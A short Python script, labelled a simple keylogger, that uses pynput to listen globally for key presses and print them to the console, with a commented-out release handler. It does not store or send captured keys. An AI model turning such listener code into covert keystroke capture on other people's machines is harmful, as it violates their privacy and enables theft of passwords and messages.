#Simple keylogger to capture keyboard inputs

from pynput import keyboard


def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)


def on_press(key):
    key_name = get_key_name(key)
    print('Key {} pressed'.format(key_name))
    #print('Key type: {}'.format(key.__class__.__name__)) #to distinguish between alphabets(keyCode) and special controls(key)

##Uncomment this function to see released keys after press
#def on_release(key):
#    key_name = get_key_name(key)
#    print('Key {} released'.format(key_name))
#
#    if str(key_name) == 'Key.esc':
#        print('Exiting ...')
#        return False

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
